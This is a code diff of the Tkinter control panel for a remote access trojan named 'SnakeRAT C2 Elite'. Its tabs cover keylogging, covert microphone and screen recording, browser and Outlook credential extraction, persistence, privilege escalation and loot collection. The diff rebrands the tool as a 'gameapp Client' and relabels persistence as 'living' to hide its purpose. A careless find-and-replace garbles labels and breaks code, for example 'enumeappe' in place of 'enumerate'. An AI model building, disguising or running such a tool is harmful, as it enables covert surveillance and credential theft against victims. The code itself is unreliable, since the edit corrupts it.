@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Advanced C2 Server - Python Tkinter GUI Frontend (gui_server.py)
+Advanced Client  Server - Python Tkinter GUI Frontend (gui_server.py)
 Full-featured GUI for s.py - All commands accessible from one interface.
 """
 import sys, os, json, threading, time, datetime, base64, queue
@@ -302,9 +302,9 @@ class SurveillanceTab(ScrollableTab):
         # LEFT: Microphone
         sh_title(L,'Microphone Record')
         mf=tk.Frame(L,bg=PANEL,pady=8,padx=10); mf.pack(fill='x',pady=(0,6))
-        lbl(mf,'Duration (seconds):').pack(anchor='w')
+        lbl(mf,'Duappion (seconds):').pack(anchor='w')
         self.mcd=tk.IntVar(value=10); ent(mf,tv=self.mcd,w=10).pack(anchor='w',pady=3)
-        btn(mf,'Record Mic',lambda:self.send('microphone',{'duration':self.mcd.get()}),bg='#0369a1').pack(anchor='w')
+        btn(mf,'Record Mic',lambda:self.send('microphone',{'duappion':self.mcd.get()}),bg='#0369a1').pack(anchor='w')
 
         # LEFT: Keylogger
         sh_title(L,'Keylogger')
@@ -332,7 +332,7 @@ class SurveillanceTab(ScrollableTab):
         sh_title(R,'Screen Recording (Server-side)')
         rf=tk.Frame(R,bg=PANEL,pady=8,padx=10); rf.pack(fill='x',pady=(0,6))
         r=tk.Frame(rf,bg=PANEL); r.pack(fill='x',pady=2)
-        lbl(r,'Duration (0=manual):',fg=TEXT2).pack(side='left')
+        lbl(r,'Duappion (0=manual):',fg=TEXT2).pack(side='left')
         self.rsd=tk.IntVar(value=0); ent(r,tv=self.rsd,w=7).pack(side='left',padx=4)
         r2=tk.Frame(rf,bg=PANEL); r2.pack(fill='x',pady=4)
         btn(r2,'Rec Screen',self._rss,bg='#7c2d12').pack(side='left',padx=3)
@@ -407,7 +407,7 @@ class CredsTab(ScrollableTab):
             ('Outlook Data','Find Outlook .pst/.ost paths + registry.',lambda:self.send('extract_outlook')),
             ('ChromeElevator','Run Chromelevator for low-level extraction.',lambda:self.send('chromelevator')),
         ]
-        for i,(title,desc,cmd) in enumerate(cards):
+        for i,(title,desc,cmd) in enumeappe(cards):
             row,col=divmod(i,3)
             card=tk.Frame(grid,bg=PANEL,padx=12,pady=12,highlightthickness=1,highlightbackground=BORDER)
             card.grid(row=row,column=col,padx=5,pady=5,sticky='nsew')
@@ -436,7 +436,7 @@ class FilesTab(ScrollableTab):
 
     def _build(self):
         hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
-        lbl(hdr,'File Operations',f=FH2,fg=ACCENT).pack(side='left')
+        lbl(hdr,'File Opeappions',f=FH2,fg=ACCENT).pack(side='left')
         main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=6)
 
         pf=tk.Frame(main,bg=PANEL,pady=8,padx=10); pf.pack(fill='x',pady=(0,7))
@@ -533,10 +533,10 @@ class SystemTab(ScrollableTab):
             btn(pwf,t,lambda _a=a:self.send('power',{'action':_a}),bg=c,py=5,px=10).pack(side='left',padx=3)
 
         # RIGHT
-        sh_title(R,'Persistence')
+        sh_title(R,'living')
         prs=tk.Frame(R,bg=PANEL,pady=8,padx=10); prs.pack(fill='x',pady=(0,6))
-        btn(prs,'Install Persistence',lambda:self.send('persistence'),bg=RED).pack(side='left',padx=3)
-        btn(prs,'Remove Persistence',lambda:self.send('unpersist'),bg=BG3,fg=TEXT2).pack(side='left',padx=3)
+        btn(prs,'Install living',lambda:self.send('living'),bg=RED).pack(side='left',padx=3)
+        btn(prs,'Remove living',lambda:self.send('unpersist'),bg=BG3,fg=TEXT2).pack(side='left',padx=3)
 
         sh_title(R,'Privilege Escalation')
         pe=tk.Frame(R,bg=PANEL,pady=8,padx=10); pe.pack(fill='x',pady=(0,6))
@@ -817,7 +817,7 @@ class ConfigTab(ScrollableTab):
 
     def _build(self):
         hdr=tk.Frame(self.container,bg=BG); hdr.pack(fill='x',padx=12,pady=(12,6))
-        lbl(hdr,'Configuration & DB Control',f=FH2,fg=ACCENT).pack(side='left')
+        lbl(hdr,'Configuappion & DB Control',f=FH2,fg=ACCENT).pack(side='left')
         main=tk.Frame(self.container,bg=BG,padx=12); main.pack(fill='both',expand=True,pady=6)
 
         sh_title(main,'Database Mode (MongoDB vs SQLite)')
@@ -836,15 +836,15 @@ class ConfigTab(ScrollableTab):
         btn(r2,'Client -> MongoDB',lambda:self.send('dbmode_client',{'mode':'mongo'}),bg='#7c2d12').pack(side='left',padx=4)
         btn(r2,'Client -> Normal (TCP)',lambda:self.send('dbmode_client',{'mode':'normal'}),bg='#166534').pack(side='left',padx=4)
 
-        sh_title(main,'Server Configuration Settings')
+        sh_title(main,'Server Configuappion Settings')
         scf=tk.Frame(main,bg=PANEL,pady=10,padx=10); scf.pack(fill='x',pady=(0,8))
         self.cfg_vars={}
         fields=[
             ('Host:','host','0.0.0.0'),
             ('Port:','port','4444'),
-            ('Encryption Key:','enc_key','AdvancedSnakeRAT_2024_CrossPlatform'),
+            ('Encryption Key:','enc_key','Advancedgameapp_2024_CrossPlatform'),
             ('Loot Directory:','loot_dir','loot'),
-            ('Log File:','log_file','c2_server.log'),
+            ('Log File:','log_file','Client _server.log'),
             ('Heartbeat Timeout (s):','hb_timeout','120'),
         ]
         for lbl_t,k,def_val in fields:
@@ -877,7 +877,7 @@ class ConfigTab(ScrollableTab):
             self.log(f'Current database mode is {m}','INFO')
 
     def _apply(self):
-        messagebox.showinfo('Config Info','Configuration applied on next server startup.')
+        messagebox.showinfo('Config Info','Configuappion applied on next server startup.')
 
     def _senv(self):
         u=self.muri.get().strip(); ep=Path('.env')
@@ -892,12 +892,12 @@ class ConfigTab(ScrollableTab):
         with open(ep,'w') as f: f.writelines(nls)
         os.environ['MONGODB_URI']=u; self.log('Saved to .env','OK')
 # ═══════════════════════════════════════════════════════════════════
-# C2 Main GUI Application
+# Client  Main GUI Application
 # ═══════════════════════════════════════════════════════════════════
 class C2GUI(tk.Tk):
     def __init__(self):
         super().__init__()
-        self.title('SnakeRAT C2 Elite — Advanced GUI')
+        self.title('gameapp Client  Elite — Advanced GUI')
         self.geometry('1400x860'); self.minsize(1200,760); self.configure(bg=BG)
         self.protocol('WM_DELETE_WINDOW',self._close)
 
@@ -907,7 +907,7 @@ class C2GUI(tk.Tk):
     def _build_ui(self):
         # Top panel
         tp=tk.Frame(self,bg=BG3,pady=8); tp.pack(fill='x',side='top')
-        lbl(tp,'SnakeRAT C2 Elite',f=FH1,fg=ACCENT,px=14).pack(side='left')
+        lbl(tp,'gameapp Client  Elite',f=FH1,fg=ACCENT,px=14).pack(side='left')
 
         # Port ctrl
         ctrl=tk.Frame(tp,bg=BG3); ctrl.pack(side='left',padx=20)
